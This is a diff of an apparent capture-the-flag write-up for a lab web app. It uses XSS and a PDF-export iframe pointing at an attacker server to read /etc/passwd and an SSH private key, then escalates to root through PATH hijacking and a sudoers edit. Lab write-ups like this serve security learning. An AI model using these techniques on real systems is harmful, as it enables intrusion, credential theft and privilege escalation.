@@ -38,7 +38,7 @@ When we access hxxp://192.168.1.60/test2/ we get the following message:
 >
 >This is an internal web application designed for employees to view their profile details and also, allow them to export their details to PDF.  
 >The web application is built and modified from the following open source project:  
->>**https://github.com/ionutvmi/master-login-system**  
+>**https://github.com/ionutvmi/master-login-system**  
 
 Well, we have a source. Let's read the installation process:  
 
@@ -54,9 +54,9 @@ In the install.php we found:
   
 >  if(!isset($page->error)) {  
 >        $page->success = "The installation was successful ! Thank you for using master loging system and we hope you enjo it ! Have fun ! <br/><br/>  
->          <a class='btn btn-success' href='./index.php'>Start exploring</a>  
->          <br/><br/>  
->          **<h3>USER: admin <br/> PASSWORD: 1234</h3>";**  
+>          \<a class='btn btn-success' href='./index.php'>Start exploring</a>  
+>          \<br/><br/>  
+>          **\<h3>USER: admin <br/> PASSWORD: 1234</h3>";**  
 
    
 Well, we have the default admin credentials...  
@@ -65,7 +65,7 @@ Now we see two options, edit profile or export profile. Let's focus on the first
 
 >Rank: Administrator  
 >Last seen: 3 months ago  
->Email: sec.9emin1@gmail.com  
+>Email: sec.9emin1@gmail[.]com  
 
 If we edit the display name we see that there's no banned chars, and it shows them in the html as they come. It's vulnerable to XSS:  
 
@@ -91,28 +91,28 @@ Let's try this scenario:
 
 kali@kali:~$ cat /var/www/html/test.php  
 
-><?php  
+>\<?php  
 >     header('location:file:///etc/passwd');  
->?>  
+>\?>  
 
 We edit the profile again with the iframe pointing at our server:  
 
   
-> <iframe height="1000" width="1000" src="http://192.168.1.115/test.php"></iframe>  
+> <iframe height="1000" width="1000" src="hxxp://192.168.1.115/test.php"></iframe>  
 
 And the pdf outputs the /etc/passwd file:  
   
-root:x:0:0:root:/root:/bin/bash  
+root\:x:0:0:root:/root:/bin/bash  
 ...
-**gemini1:x:1000:1000:gemini-sec,,,:/home/gemini1:/bin/bash**  
+**gemini1\:x:1000:1000:gemini-sec,,,:/home/gemini1:/bin/bash**  
 ..
 
 Here we find the home folder of the local user in the machine: gemini1. Now we need to enter without the key. Let's try the ssh id_rsa file:
   
 kali@kali:~$ cat /var/www/html/test.php  
-><?php  
+>\<?php  
 >     header('location:file:///home/gemini1/.ssh/id_rsa');  
->?>  
+>\?>  
 
 Now it outputs the key: 
 
@@ -123,12 +123,14 @@ Now it outputs the key:
 
 Now, we can log in the server without the user password:
 
-kali@kali:~$ vim rsa.key   
+kali@kali:~$ vim rsa.key  
+
 kali@kali:~$ sudo ssh -l gemini1 192.168.1.60 -i rsa.key   
 >Linux geminiinc 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64  
->...
+>...  
 >Last login: Tue Jan  9 08:04:52 2018 from 192.168.0.112  
 >gemini1@geminiinc:~$   
+>  
 >gemini1@geminiinc:~$ id  
 >uid=1000(gemini1) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)  
 
@@ -182,6 +184,7 @@ ls /root/
 cat /root/flag.txt  
 
 gemini1@geminiinc:~$ chmod +x date  
+
 gemini1@geminiinc:~$ listinfo  
 ...    
 displaying current date...    root  
@@ -236,7 +239,8 @@ Second one, make gemeni1 a user that can execute sudo without password:
 gemini1@geminiinc:~$ cat date  
 >echo "gemini1 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers  
 gemini1@geminiinc:~$ listinfo  
->...      
+>...  
+
 gemini1@geminiinc:~$ sudo -l  
 >Matching Defaults entries for gemini1 on geminiinc:  
 >    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -266,6 +270,7 @@ gemini1@geminiinc:~$ cat test.c
 >}  
 
 gemini1@geminiinc:~$ gcc test.c -o date  
+  
 gemini1@geminiinc:~$ listinfo  
 >...  
 root@geminiinc:~# id  
